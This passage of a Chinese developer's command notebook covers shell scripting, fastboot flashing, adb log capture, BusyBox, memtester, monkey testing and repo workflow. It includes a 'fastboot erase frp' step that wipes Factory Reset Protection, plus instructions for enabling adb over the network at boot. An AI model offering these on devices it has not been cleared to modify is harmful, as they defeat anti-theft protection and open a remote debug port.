"What is the Linux distro of your choice?" 15 60 4 \
"debian" "Venerable Debian" ON \
"ubuntu" "Popular Ubuntu" OFF \
"centos" "Stable CentOS" OFF \
"mint" "Rising Star Mint" OFF 3>&1 1>&2 2>&3)
 
exitstatus=$?
if [ $exitstatus = 0 ] ; then
    echo "The chosen distro is:" $DISTROS
else
    echo "You chose Cancel."
fi　

// 多选对话框
#!/bin/bash
DISTROS=$(whiptail --title "Checklist Dialog" --checklist \
"Choose preferred Linux distros" 15 60 4 \
"debian" "Venerable Debian" ON \
"ubuntu" "Popular Ubuntu" OFF \
"centos" "Stable CentOS" ON \
"mint" "Rising Star Mint" OFF 3>&1 1>&2 2>&3)
 
exitstatus=$?
if [ $exitstatus = 0 ] ; then
    echo "Your favorite distros are:" $DISTROS
else
    echo "You chose Cancel."
fi

// 进度条对话框
#!/bin/bash
{
    for ((i = 0 ; i <= 100 ; i+=20)); do
        sleep 1
        echo $i
    done
} | whiptail --gauge "Please wait while installing" 6 60 0
```

## [CMD] Shell中字符串比较忽略大小写的问题

```text
方法一: 借助tr命令来处理
#!/bin/bash
name1="TOm"
name2="tom"
 
temp1=$(echo $name1 | tr [a-z]  [A-Z] )    # 将name1全部转变成大写再做比较
temp2=$(echo $name2 | tr [a-z]  [A-Z] )    # 将name2全部转变成大写再做比较
 
if [ x"$temp1" = x"$temp2" ] ;then        # x$"temp1"前面加x防止其中为空
    echo "OK"
else
    echo "NO"
fi
方法二: 借助grep命令来处理
#!/bin/bash
name="TOM"
 
if echo "$name" | grep -qwi "tom"
then
    echo "OK"
else
    echo "NO"
fi 
备注: 

-q        # 静默的方式，即不会产生输出，成功则$?返回0，刚好走if的条件分支，非常巧妙！
-i         # 匹配字符串，但忽略大小写
-w       # 按照单词进行匹配 
方法三: 借助shopt命令来处理
ss

#!/bin/bash
name1="TOM"
name2="tom"
 
shopt -s nocasematch   # 打开Bash的开关，忽略大小写
 
case "$name1" in
    $name2)  echo "MATCH"  ;;
         *)  echo "NO"     ;;
esac
```

## [CMD] fastboot

```text
fastboot 代码
alps/system/core/fastboot

重启进入fastboot模式
adb reboot bootloader
adb reboot fastboot

fastboot erase userdata             //有哪些分区可以erase??
fastboot getvar unlocked            //这个值保存在什么地方??
fastboot getvar all                 //获取所有bootloader中保存的值，这些值保存在什么地方??
fastboot reboot
fastboot flashing unlock
fastboot format XXXX                //有哪些分区可以 format???
fastboot devices
fastboot flash logo logo-sign.bin   //这个没成功??FAILED (remote: 'No such file or directory')
fastboot flash system system.img    //使用flash刷机的时候需要先unlock bootloader

//通过这个命令可以查看是否已解锁boot
adb shell getprop ro.boot.flash.locked

fastboot 是怎么和手机连接上的??
adb logcat 是怎么 waiting for device 的???adb wait-for-any-device

使用fastboot命令刷机流程详解
首先需要准备好刷机包，可以是自己编译的，也可以是从别处拷贝的，但一定要确保刷机包适用于你的 Android 设备。然后解压刷机包，解压后我们可以得到 boot.img、recovery.img、system.img、bootloader 文件，正是这些文件构成了 Android 设备的系统。
让设备进入 fastboot 环境。有 2 种方法：
执行命令 adb  reboot  bootloader
或者
同时按住 增加音量 和 电源 键开机。
fastboot  flashing  unlock    # 设备解锁，开始刷机
fastboot  flash  boot  boot.img    # 刷入 boot 分区。如果修改了 kernel 代码，则应该刷入此分区以生效
fastboot  flash  recovery  recovery.img    # 刷入 recovery 分区
fastboot  flash  country  country.img    # 刷入 country 分区。这个分区是开发组自己划分的，别的 Android 设备上不一定有
fastboot  flash  system  system.img    # 刷入 system 分区。如果修改的代码会影响 out/system/ 路径下生成的文件，则应该刷入此分区以生效 
fastboot  flash  bootloader  bootloader    # 刷入 bootloader
fastboot  erase  frp    # 擦除 frp 分区，frp 即 Factory Reset Protection，用于防止用户信息在手机丢失后外泄
fastboot  format  data    # 格式化 data 分区
fastboot  flashing lock    # 设备上锁，刷机完毕
fastboot  continue    # 自动重启设备
```

## [CMD] 获取apk包名的几种方法

```text
adb shell ls -l /data/data
adb shell pm list package -f
adb shell dumpsys window w | grep "name"
adb logcat | grep START
aapt dump badging (apk path)
Hierayviewer
apktool
adb logcat | grep Android.intent.category.LAUNCHER

//一条命令获取包名
aapt dump badging xxx.apk | grep "package" | awk -F " " '{print $2}' | awk -F "=" '{print $2}' | awk -F "'" '{print $2}'

//一条命令获取包名，加到 ~/.zshrc 文件中
alias getp='_notice(){ aapt dump badging $1 | grep package | awk -F " " {'\''print $2'\''} | awk -F "=" {'\''print $2'\''} | awk -F "'\''" {'\''print $2'\''}}; _notice'

9.envsetup.sh 中的方法
adb shell ps | tr -d '\r' | sed -e 1d -e 's/^[^ ] * *\([0-9] *\).* \([^ ] *\)$/\1 \2/'
```

## [CMD] Android将softsim加入到后台白名单

```text
$ adb shell dumpsys deviceidle whitelist +com.mediatek.vsim
Added: com.mediatek.vsim

$ adb shell dumpsys deviceidle whitelist +im.softs.softsim
Added: im.softs.softsim

或者
adb shell cmd deviceidle　 whitelist +com.mediatek.vsim
adb shell cmd deviceidle　 whitelist +im.softs.softsim

从白名单中移除：
adb shell cmd deviceidle whitelist  -com.tencent.mm



查看　adb shell cmd　命令 (在Android N中添加了这个命令，　之前是没有的）

adb shell cmd -l
cactus:/ $ cmd deviceidle whitelist
system-excidle,com.android.updater,9802
system-excidle,com.android.providers.downloads,10014
system-excidle,com.android.shell,2000
system-excidle,com.android.deskclock,10096
system,com.android.updater,9802
system,com.android.providers.downloads,10014
system,com.android.shell,2000
system,com.android.deskclock,10096
user,com.android.cts.priv.ctsshim,10006
user,org.simalliance.openmobileapi.uicc2terminal,10064
user,com.miui.contentextension,10030
user,com.miui.fm,10048
user,com.android.providers.calendar,10000
user,com.xiaomi.vipaccount,10052
user,com.android.providers.media,10014
user,com.milink.service,10085
user,com.mobiletools.systemhelper,10094
user,com.xiaomi.account,10075
user,com.android.wallpapercropper,10019
user,com.xiaomi.micloud.sdk,10035
user,com.miui.packageinstaller,10001
user,org.simalliance.openmobileapi.service,10051
user,com.android.documentsui,10021
user,com.android.externalstorage,10031
user,com.mediatek.vsim,10153
user,com.xiaomi.gamecenter.sdk.service,10036
user,com.android.htmlviewer,10084
user,com.miui.securityadd,10060
user,com.android.companiondevicemanager,10103
user,com.miui.gallery,10025
user,com.android.quicksearchbox,10009
user,im.softs.softsim,10152
user,com.android.providers.downloads,10014
user,com.xiaomi.payment,10100
user,com.mediatek.omacp,10080
user,com.android.browser,10033
user,com.android.soundrecorder,10004
user,com.android.defcontainer,10015
user,com.miui.guardprovider,10095
user,com.android.providers.downloads.ui,10014
user,com.android.pacprocessor,10045
user,com.miui.micloudsync,10074
user,com.xiaomi.ab,10073
user,com.android.certinstaller,10063
user,com.android.carrierconfig,10028
user,com.google.android.marvin.talkback,10076
user,com.android.contacts,10003
user,com.miui.hybrid,10065
user,com.mi.webkit.core,10023
user,com.android.mms,10032
user,com.android.mtp,10014
user,com.android.backupconfirm,10039
user,se.dirac.acs,10024
user,com.xiaomi.simactivate.service,10047
user,com.miui.player,10042
user,com.android.statementservice,10011
user,com.android.calendar,10037
user,com.miui.translation.kingsoft,10043
user,com.miui.virtualsim,10107
user,com.miui.compass,10124
user,com.miui.vpnsdkmanager,10057
user,com.android.sharedstoragebackup,10013
user,com.android.printspooler,10078
user,org.simalliance.openmobileapi.uicc1terminal,10097
user,com.miui.personalassistant,10026
user,com.android.dreams.basic,10090
user,com.android.incallui,10007
user,com.fido.xiaomi.uafclient,10059
user,com.fido.asm,10079
user,com.android.bips,10102
user,com.xiaomi.mircs,10034
user,com.miui.translation.youdao,10070
user,com.miui.cloudbackup,10040
user,com.google.android.webview,10050
user,android.ext.shared,10049
user,com.android.onetimeinitializer,10038
user,com.mipay.wallet,10061
user,com.android.camera,10041
user,com.android.printservice.recommendation,10058
user,com.xiaomi.upnp,10071
user,com.xiaomi.xmsf,10077
user,android.ext.services,10027
user,com.android.calllogbackup,10003
user,com.svox.pico,10010
user,com.android.proxyhandler,10016
user,com.miui.notes,10119
user,com.miui.video,10018
user,com.xiaomi.market,10069
user,com.miui.translationservice,10087
user,com.miui.cloudservice,10074
user,com.android.managedprovisioning,10022
user,com.miui.hybrid.accessory,10055
user,com.miui.translation.xmcloud,10099
user,com.sohu.inputmethod.sogou.xiaomi,10098
user,com.xiaomi.providers.appindex,10046
user,com.mediatek.op09clib.telecom,10067
user,com.android.smspush,10093
user,com.miui.calculator,10148
user,com.android.wallpaper.livepicker,10054
user,com.miui.miwallpaper,10081
user,com.miui.securityinputmethod,10068
user,com.xiaomi.metoknlp,10091
user,com.android.storagemanager,10008
user,com.miui.analytics,10088
user,com.miui.weather2,10147
user,com.xiaomi.scanner,10122
user,com.android.cts.ctsshim,10089
user,com.miui.yellowpage,10003
user,com.android.vpndialogs,10017
user,com.mediatek.op01.telecom,10053
user,com.android.email,10117
user,com.miui.voiceassist,10083
user,com.android.providers.blockednumber,10003
user,com.android.providers.userdictionary,10003
user,com.miui.providers.weather,10012
user,com.android.emergency,10020
user,com.miui.greenguard,10101
user,com.android.deskclock,10096
user,com.android.bluetoothmidiservice,10086
user,com.miui.smsextra,10092
user,com.mediatek.mtklogger,10072
user,com.android.thememanager.module,10044
user,com.lbe.security.miui,10005
user,com.android.providers.contacts,10003
user,com.android.captiveportallogin,10062
user,com.mediatek.mtklogger.proxy,10104
user,com.mediatek.dataprotection,10105
user,com.miui.core,10056
user,com.miui.home,10002
还有，appos允许后台运行

adb shell appops set  com.mediatek.vsim RUN_IN_BACKGROUND allow
或者
adb shell cmd appops set  com.mediatek.vsim RUN_IN_BACKGROUND allow
adb shell cmd appops set im.softs.softsim RUN_IN_BACKGROUND allow

查询允许运行在后台

adb shell cmd  appops  query-op  RUN_IN_BACKGROUND allow

禁止后台运行

adb shell cmd appops set com.sina.weibo RUN_IN_BACKGROUND deny
adb shell cmd appops set com.tencent.mm  RUN_IN_BACKGROUND deny

联想手机还有几处设置：
1.安全中心-->内存加速-->设置(右上角图标)-->加速保护名单
2.最近的应用列表：下滑加锁
3.电池管理-->电池优化-->待机省电　
```

## [CMD] Android移植memtester

```text
由于客户反馈在终端使用过一段时间后出现一些意想不到的问题，为了模拟消耗过多然后出现的问题，今天记录一下在android上面使用一个内存压力测试工具memtester在android上面的使用：

1.获取相关源码，下载地址如下:http://pyropus.ca/software/memtester/，或者通过wget的方式进行下载，具体如下wget http://pyropus.ca/software/memtester/old-versions/memtester-4.2.2.tar.gz，其中4.2.2是版本信息，可以是其他版本

2.解压源码到android源代码的external目录下面

3.使用下述的Android.mk文件进行编译

# used to gen: memtester
# by tangkw
# 2014-1-7
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)
LOCAL_MODULE := memtester 
LOCAL_MODULE_TAGS := optional
# memtester source files
LOCAL_SRC_FILES := memtester.c tests.c
LOCAL_C_INCLUDES := $(LOCAL_PATH)/
include $(BUILD_EXECUTABLE)

4.配置好android编译环境后，在该源码目录下面使用mm -B  -j32进行编译(有些平台可能不支持-B，可以除去此命令)，此时就会生成memtester，然后将其push到android系统中然后执行就OK了。

5.Usage: memtester [-p physaddrbase]  [B|K|M|G]  [loops]   
如：  
memtester 100M 10 #测试100M内存消耗10次。  

root@A920:/system/bin # ./memtester  100M 10
memtester version 4.2.2 (32-bit)
Copyright (C) 2010 Charles Cazabon.
Licensed under the GNU General Public License version 2 (only).

pagesize is 4096
pagesizemask is 0xfffff000
want 100MB (104857600 bytes)
got  100MB (104857600 bytes), trying mlock ...locked.
Loop 1/10:
Stuck Address       : ok
Random Value        : ok
Compare XOR         : ok
Compare SUB         : ok
Compare MUL         : ok
Compare DIV         : ok
Compare OR          : ok
Compare AND         : ok
Sequential Increment: ok
Solid Bits          : ok
Block Sequential    : setting 160

最后附上编译OK的执行文件Android下memtester执行文件，方便读者使用。



一、什么是memtester，有什么用？

1、memtester是一款开源的内存测试工具，一般用来Linux下测试内存的稳定性，捕获内存错误和坏位，测试内容包括：随机值,异或比较,减法,乘法,除法,与或运算等等。

2、其下载地址为：http://pyropus.ca/software/memtester/ 文件为 memtester-4.3.0.tar.gz

3、使用方法，在命令行界面输入 memtester [size: B/K/M/G]  [counnts] 

二、代码简单说明

其核心代码包括：memtester.c 和 tests.c 2个文件，memtester.c 主要内容为测试流程，tests.c 的主要内容为测试方法，下述为主要函数的图片：


三、Android的移植

1、在Android的源代码的system/core 目录新建文件夹 memtester，然后将所有的文件复制到此文件夹，并删除Makefile文件。

2、新建Android.mk 文件，输入如下内容：

LOCAL_PATH := $(call my-dir)  
  
include $(CLEAR_VARS)  
  
LOCAL_SRC_FILES := \  
    memtester.c \  
    tests.c  
  
LOCAL_SHARED_LIBRARIES := libcutils  
  
LOCAL_MODULE := memtester.32bit  
  
LOCAL_C_INCLUDES := \  
        memtester.h \  
        tests.h \  
        types.h  
  
#LOCAL_CFLAGS := -Werror  
  
include $(BUILD_EXECUTABLE)  
3、编译 memtester，步骤如下：

先执行 source build/envsetup.sh ，然后 lunch 并选择正确的项目，输入

mmm /system/core/memtester  
就可以到out/target/product/xxx/system/bin 目录下找到编译好的memtester.32bit 文件，此编译好的二进制文件可以目前32bit的Android平台的机器进行内存测试。

四、应用

1、已移植了此代码的平台，直接输入 memtester.32bit 100M 10，即可进行内存[DDR] 测试。

2、未安装可用adb 推送到系统中进行测试，按照如下顺序：

adb root   
adb remount  
adb push memtester.32bit /system/bin/  
adb shell  
memtester.32bit 100M 10  
```

## [CMD] 统计apk里的方法数

```text
../../../Android/android_sdk/build-tools/22.0.1/dexdump.exe -f bin/classes.dex | grep.exe method_ids_size
method_ids_size     : 32231
```

## [CMD]  [log] 屏蔽logcat中某个tag的方法 tag:^(?!TAG)

```text
tag:^(?!IMGSRV) tag:^(?!dalvikvm) tag:^(?!mdpservice) tag:^(?!inputm)
```

## [CMD] 利用app_process启动一个java程序

```text
app_process实际上就是zygote，它已经有载入android.jar等Android环境，所以它能执行Android程序。

参考 am 和 pm 的启动脚本
am:
base=/system
export CLASSPATH=$base/framework/am.jar
exec app_process $base/bin com.android.commands.am.Am "$@"

pm:
base=/system
export CLASSPATH=$base/framework/pm.jar
exec app_process $base/bin com.android.commands.pm.Pm "$@"

CLASSPATH指定了你的程序的位置，com.android.commands.pm.Pm则说明了程序的入口为com.android.commands.pm.Pm，即入口函数main()所在的类，"$@"就是传递给main（）函数的参数，只是这里"$@"本身又是个shell传入的参数而已
需要注意的是CLASSPATH中的文件必须是dalvik文件格式的，关于此的转换请参考《基本Dalvik VM调用》当然CLASSPATH中的文件可以是apk文件，只是你的apk中至少应该有个拥有main()入口函数的类。

https://github.com/zgj224/Android-Demo/tree/master/app_process_exec_java_demo
1.执行jar包里的java可执行文件
使用app_process启动java文件,其中java里必须有main()方法，这是函数入口。
# adb shell CLASSPATH=/system/framework/Demo.jar exec app_process /system/bin com.example.Demo
 
或在apk里启动一个可执行com.example.helloworld.Console里的main()
# adb shell CLASSPATH=/data/app/com.example.helloworld-1.apk exec app_process /system/bin com.example.helloworld.Console
注意：/system/bin这个目录可以替换为任意目录
 
2.执行java文件
<1>.Hello.java
public static class Hello {
　　public void main(String args[] ){
　　　　System.out.println("Hello Android");
　　}
}
 
<2>.编译
# javac Hello.java
编译出Hello.class文件可以在普通的jvm上运行，要放到android下还需要转换成dex，需要用android sdk中的dx工具进行转换
# cd SDK/build-tools //SDK为自己下载的android sdk
# dx --dex --output=Hello.dex Hello.class
得到Hello.dex
 
<3>.Hello.dex push到/sdcard
# adb push Hello.dex /sdcard
 
<4>.使用app_process 运行hello.dex
# app_process -Djava.class.path=/sdcard/Hello.dex /sdcard Hello
```

## [CMD] 通过busybox的netstat确定端口占用

```text
今天碰到一个问题，安全部分说我们机器8000端口一直处理LISTEN状态，让我查一下是哪个进程，需要解除这个状态，要确认是哪个进程在监听这个8000端口，我首先adb shell之后使用netstatus

root@p92s_hd:/ # netstat
Proto Recv-Q Send-Q Local Address          Foreign Address        State
 tcp       0      0 0.0.0.0:8000           0.0.0.0:*              LISTEN
 tcp       0      0 127.0.0.1:5037         0.0.0.0:*              LISTEN
可以看到里面有8000和5037端口在被使用，5037是adb, 8000是什么呢

然后我就用cat /proc/net/tcp看了一下

root@p92s_hd:/ # cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 36594 1 0000000000000000 100 0 0 10 0
   1: 0100007F:13AD 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 35288 1 0000000000000000 100 0 0 10 0
看到uid是0的时候我一下子就尴尬了，根据系统定义这是root啊，这东西ps看能有几十个吧，根本确定不了用哪个，没办法只能用busybox工具来看了，
首先下载busybox，在这里根据机器型号自己选择，下载的时候先点进去自己要下载的，然后再右键保存。

将文件名字改成busybox，不要后缀
adb push 到手机，比如 adb push ~/Download/busybox /sdcard
把busybox 复制到xbin下，首先 adb shell 然后cp /sdcard/busybox /system/xbin/（记住机器要adb remount）
修改busybox的执行权限 cd /system/xbin/ 然后 chmod 777 busybox sync 同步一下
然后验证一下 busybox vi
好了，下面就可以看8000是哪个程序再使用了
root@p92s_hd:/system/xbin # busybox netstat -tlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      264/htfsk
tcp        0      0 localhost:5037          0.0.0.0:*               LISTEN      2583/adbd
```

## [CMD]  [log] 抓取log

```text
2、anr log

adb pull /data/anr

3、tombstone log

adb pull /data/tombstones

4、core log

adb pull  /data/log/core

5、开机log

adb shell dmesg > dmesg.txt

6、logcatch

adb pull /data/logcatch

7、qxdm log

adb pull /sdcard/logs

8、 hprof log

在分析app 时，我们通常需要分析app 的java heap 资料，如分析java 的memory leak, 追查heap
中相关变量情况等。
在android 中抓取app 的hprof 操作方式有下面几种:
第一种方式: 使用am 命令
   adb shell am dumpheap {Process} file
   如 adb shell am dumpheap com.android.phone /data/anr/phone.hprof
   adb pull /data/anr/phone.hprof
第二种方式: 使用DDMS 命令
   在DDMS 中选择对应的process, 然后在Devices 按钮栏中选择Dump Hprof file， 保存即可
第三种方式: 通过代码的方式
   在android.os.Debug 这个class 中有定义相关的抓取hprof 的method.
如: public static void dumpHprofData(String fileName) throws IOException;
这样即可在代码中直接将这个process 的hprof 保存到相对应的文件中，注意这个只能抓取当时的
process.
如果想抓其他的process 的hprof, 那么就必须通过AMS 帮忙了。
可以先获取IActivityManager 接口，然后调用它的dumpheap 方法。具体的代码，大家可以参考
frameworks/base/cmds/am/src/com/android/commands/am/am.java 中的调用代码
抓取回hprof 后，就可以用hprof-conv 命令将DVM 格式的hprof 转换成标准的java 命令的hprof
   hprof-conv in.hprof out.hprof
然后使用如MAT 之类的工具进行具体的分析

9、bugreport

测试之前手机连接usb打开usb调试开关执行以下命令
a、adb shell dumpsys batterystats --reset
b、adb shell dumpsys batterystats --enable full-wake-history
adb bugreport > bugreport.txt

10、kernel log(只有从当前时间起的很少的log)

cat proc/kmsg > kmsg.txt

11、其他

adb shell dumpstate //各类信息，比如进程信息，内存信息，进程是否异常，kernnel的log等
adb shell dumpcrash
adb shell dumpsys  //查询所有service的状态
```

## [CMD] adb 后台打印kernel log 和ap log

```text
cat /dev/kmsg -n > kernel.log && logcat -v time > app.log &
```

## [CMD] Android iw 使用方法

```text
iw是Android一个新的为无线网络设备配置工具，基于nl80211命令行配置工具集，Linux则默认支持iwconfig。记录下几个常用的iw命令：
1、获取设备支持的模式
adb shell iw list

2、扫描
adb shell iw dev wlan0 scan

3、列出事件
adb shell iw event

4、获取设备信息
adb shell iw dev
```

## [CMD]  [log] Linux串口工具ckermit打印 android log

```text
1、安装
sudo apt-get install ckermit

2、配置 /etc/kermit/kermrc 或者~/.kermrc 
set line /dev/ttyUSB0 #串口号
set speed 115200  #波特率
set carrier-watch off
set handshake none
set flow-control none
robust
set file type bin
set file name lit
set rec  pack 1000
set send pack 1000
set window 5

3、插上串口线
ls /dev/ttyUSB*   //查看串口设备 
sudo kermit -c 
or
sudo chmod 777 /dev/ttyUSB0 //设置权限
kermit -c   // 执行命令打印android 输出log
```

## [CMD] android AT指令获取SIM卡ICCID

```text
1、打开终端
adb shell
cat /dev/TTYEMS02

2、打开另一终端，发送AT指令（ICCID为20位）
echo "at^DCID\r" > /dev/TTYEMS02

3、打印RIL(radio interface layer)的log
adb logcat -b radio -s RIL
```

## [CMD] Linux目录/usr/bin和 /usr/local/bin区别

```text
1、/usr/bin下面的都是系统预装的可执行程序，系统升级有可能会被覆盖.
2、/usr/local/bin目录是给用户放置自己的可执行程序.
```

## [CMD] android开机启动shell脚本

```text
1、system/core/rootdir/init.rc

service start_test /system/bin/test.sh    
    user root
    group root
    disabled
    oneshot
on property:sys.boot_completed=1
    start start_test

2、在/system/bin下创建test.sh
#!/system/bin/sh
echo "Test Success!"
```

## [CMD] 为Android安装BusyBox--完整的bash shell

```text
大家是否有过这样的经历，在命令行里输入adb shell，然后使用命令操作你的手机或模拟器，但是那些命令都是常见Linux命令的阉割缩水版，用起来很不爽。是否想过在Android上使用较完整的shell呢?用BusyBox吧。不论使用adb连接设备使用命令行还是在手机上直接用terminal emulator都可以。

一、什么是BusyBox ?

BusyBox 是标准 Linux 工具的一个单个可执行实现。BusyBox 包含了一些简单的工具，例如 cat 和 echo，还包含了一些更大、更复杂的工具，例如 grep、find、mount 以及 telnet。有些人将 BusyBox 称为 Linux 工具里的瑞士军刀.简单的说BusyBox就好像是个大工具箱，它集成压缩了 Linux 的许多工具和命令。（摘自百度百科）

二、在Android上安装BusyBox

准备：

0. 先要把手机给Root了，具体教程这里就不提供了，网上有很多。

1. 下载BusyBox的binary，打开这个地址 http://www.busybox.net/downloads/binaries ，选择最新版本，然后下载对应你的设备架构的版本，这里我下载了busybox-armv6l，下面将以这个文件名为示例。

2. 需要有一个命令行的环境，在电脑上使用adb或在手机上使用terminal emulator。

3. 连接手机和电脑，手机的USB Mode设置成None（仅充电），并且开启USB调试模式。

安装：

1. 将busybox-armv6l重命名为busybox

2. 将busybox传入手机的SD卡，可以使用下面的命令或自己想其他办法。

打开terminal（Linux，Mac）或cmd（Windows）

adb push ~/Desktop/busybox /mnt/sdcard
其中的~/Desktop请根据自己的情况替换成正确的路径

3. 输入以下命令，为了在/system目录写入文件

adb shell
su
mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system
使用 ls 检查一下 /system 里是否有 xbin 目录，没有的话输入 mkdir xbin 创建，因为本示例是要把busybox安装到 /system/xbin 。

4. 复制 busybox 文件到 /system/xbin，并为其分配“可执行”的权限

cp /mnt/sdcard/busybox /system/xbin
chmod 755 busybox
5. 这时就可以使用 busybox 的命令了，例如以前没有清屏的clear命令，现在只需输入 busybox clear 就可以实现清屏功能，使用完整版的 ls 只需输入 busybox ls 。

但是每次前面都加上个busybox太麻烦了，所以我们还要继续完成安装。

在 /system/xbin 下输入

busybox --install .
如果想安装到别的目录，则把点替换成别的路径。

至此就安装完成了，比较一下原来的 ls 命令和 busybox 里的 ls 命令。

常见错误：

1. 如果安装时出现这样的错误，

busybox: /bin/zcat: No such file or directory

busybox: /sbin/zcip: Invalid cross-device link

说明没有输入安装路径，正确的示例 busybox --install /system/xbin

2. 如果出现这样的错误，

cp: /system/xbin/busybox: Read-only file system

说明没有正确输入上面第三步的mount命令。

小技巧：

1. busybox 里有 ash 和 hush 还有 sh 这几种 shell，在命令行输入 ash 或 hush，可以像在 bash 里那样，通过按上下键选择刚才输入的命令。

2. android系统本身就有ls命令，busybox里也有ls，输入ls时调用的是android的ls，那么想用busybox的ls就要每次都在前面加个busybox吗?不用，使用alias命令可以搞定。

alias ls='busybox ls'
同样的，cp、mv等二者都有的命令都可以这样搞定。也可以通过修改 /init.rc 来解决。
```

## [CMD] monkey

```text
整机 monkey 测试
adb shell monkey --ignore-crashes --ignore-timeouts --ignore-security-exceptions --throttle 100 -v 999999999 > monkey_log.txt

单个 app monkey 测试
adb shell monkey -p com.qiyi.video（要测试app的包名） --ignore-crashes --ignore-timeouts --ignore-security-exceptions --throttle 100 -v 999999999 > monkey_log.txt
```

## [CMD] systemui演示模式

```text
adb shell settings put global sysui_demo_allowed 1
Enable/disable icons by running the right command

// display time 12:00
adb shell am broadcast -a com.android.systemui.demo -e command clock -e hhmm 1200

// Display full mobile data without type
adb shell am broadcast -a com.android.systemui.demo -e command network -e mobile show -e level 4 -e datatype false

// Hide notifications
adb shell am broadcast -a com.android.systemui.demo -e command notifications -e visible false

// Show full battery but not in charging state
adb shell am broadcast -a com.android.systemui.demo -e command battery -e plugged false -e level 100
Run app and take screenshots

Exit demo mode once you are done

adb shell am broadcast -a com.android.systemui.demo -e command exit
```

## [CMD] Android重启framework命令及framework.jar引用

```text
1、重启framwork命令
adb shell start //启动framework
adb shell stop //停止framework
or
adb shell am restart //重启framework
 
adb shell am kill-all //杀死后台所有进程
adb shell am force-stop 包名 //强杀进程
 
//参考
am start [options]  <INTENT> 启动Activity startActivityAsUser
am startservice <INTENT> 启动Service startService
am stopservice <INTENT> 停止Service stopService
am broadcast <INTENT> 发送广播 broadcastIntent
am kill <PACKAGE> 杀指定后台进程 killBackgroundProcesses
am kill-all 杀所有后台进程 killAllBackgroundProcesses
am force-stop <PACKAGE> 强杀进程 forceStopPackage
am hang 系统卡住 hang
am restart 重启 restart
am bug-report 创建bugreport requestBugReport
am dumpheap <pid> <file> 进程pid的堆信息输出到file dumpheap
am send-trim-memory <pid><level> 收紧进程的内存 setProcessMemoryTrimLevel
am monitor 监控 MyActivityController.run

am start -a android.intent.action.VIEW
am start -n com.yuanhh.app/.MainActivity
am start -d content://contacts/people/1
am start -t image/png
am start -c android.intent.category.APP_CONTACTS

2、Eclipse等IDE可以导入classes.jar直接引用
路径：out\target\common\obj\JAVA_LIBRARIES\framework_intermediates/classes.jar 
```

## [CMD] Android打开/关闭wifi命令

```text
1.切换root权限
adb root; adb remount

2.关闭wifi
adb shell svc wifi disable

3.打开wifi
adb shell svc wifi enable
```

## [CMD] Shell彩色输出

```text
color_success="\e[0;32m"
color_failed="\e[0;31m"
color_reset="\e[00m" 

echo -e "${color_success} make completed successfully."
echo -e "\e[1;31m make completed failed."
echo -e "\e[1;34m make completed reset."
```

## [CMD] Shell死循环

```text
#!/bin/bash
while [ 1 ] 
do
    sleep 1
    adb logcat -v time
done

#!/bin/bash
for ((;;))
do
    sleep 1
    ifconfig
done
```

## [CMD] shell逻辑判断&&和-a区别

```text
实例:-a,-o,!等同于&&,||,! ======>与，或，非
&&:如果&&左侧为假，则&&右侧表达式不执行.
||:如果&&左侧为假，则继续执行右侧表达式。
str1="down"
str2="down"
str3="down"
while [ 1 ] 
    sleep 1
do
    #if [ "up" = "$(str1)" -a "up" = "$(st2)" -o "up" = "$(st3)" ] ;then
    #if [ "up" = "$(str1)" && [["up" = "$(str2)" || "up" = "$(str3)" ] ] ] ;then   
    if [ "up" = "$(str1)" ] ;then   
        echo  123456 > ./test.txt
        break;
    fi
done
```

## [CMD]  [repo] repo一个新工程使用步骤

```text
1.下载.git
repo init -u ssh://xxxxx
 
2.修改default.xml添加自己帐户权限
emacs .repo/manifests/dfault.xml
ssh://192.168.25.15:29419/xxx
改为:
ssh://gerrit-username@192.168.25.15:29419/xxx
 
3.同步代码
repo sync -j48 
or:
repo sync -j48 -c --no-tags
 
4.切换分支，如切换到dev分支
repo start dev --all
 
5.注释与提交代码
git commit -s //调出注释格式
git push dev HEAD:refs/for/dev //提交代码
 
6.修改提交信息
git commit --amend
git push --no-thin dev HEAD:refs/for/dev
 
7.同步当前目录代码
repo sync .
 
8.如果当前工程在根目录.repo/manifests/default.xml添加新的工程，可以删除当前目录下的文件及.git,然后在根目录.repo/manifests/default.xml里找到对应路径，如:device/qcom/common
cd device/qcom/common
rm -rf * && rm -rf .git
repo sync device/qcom/common
```

## [CMD] Android7.1开机启动wifi adb

```text
adb pull /system/build.prop
#添加
service.adb.tcp.port=5555
persist.service.adb.enable=1
 
adb connect 192.168.1.32:5555
```

## [CMD]  [工具] ffmpeg命令参考

```text
ffmpeg -f v4l2 -i /dev/video0 output.mp4 //ffmpeg 获取摄像头/dev/video0并输出.mp4文件
ffplay -f rawvideo -video_size 1920x1080 a.yuv //ffplay播放yuv文件命令
ffprobe -v quiet -print_format json -show_format -show_streams  video.mp4  #将视频中的音视频信息，以json格式返回
或
ffprobe -show_format -show_streams video.mp4

sudo apt-get install ffmpeg

// 制作 gif 动画
ffmpeg -t 3.6 -ss 00:00:01 -i 01.mp4 01.gif

注释：3.6是秒数，00:00:01是开始时间。 
这一个命令足够走天下了。

https://blog.csdn.net/gjy_it/article/details/90448722

用 ffmpeg 下载 m3u8 视频
ffmpeg -i [m3u8地址]  output.mp4
```

## [CMD] nm查看动态库/静态库/可执行文件

```text
nm:选项

-A 在每个符号信息的前面打印所在对象文件名称；
-C 输出demangle过了的符号名称；
-D 打印动态符号；
-l 使用对象文件中的调试信息打印出所在源文件及行号；
-n 按照地址/符号值来排序；
-u 打印出那些未定义的符号；
 
nm -A ./* | grep h264
nm -A *.a
nm -a *.so
nm -A a.out
```

## [CMD] lsof查看进程所打开的文件

```text
adb shell lsof 993
```

## [CMD] date在logcat中使用

```text
adb logcat -s NetlinkEvent | tee $(date "+%Y:%m:%d-%H:%M:%S".log)
adb logcat | packages-$(date "+%Y-%m-%d-%H:%M:%S"-123.log)
```

## [CMD] 编译android与tar打包命令

```text
//test.sh
make update-api -j$(grep -c ^processor /proc/cpuinfo)
make -j$(grep -c ^processor /proc/cpuinfo) 2>&1 | tee build_All.log
make otapackage -j$(grep -c ^processor /proc/cpuinfo) 2>&1 | tee build_ota.log
 
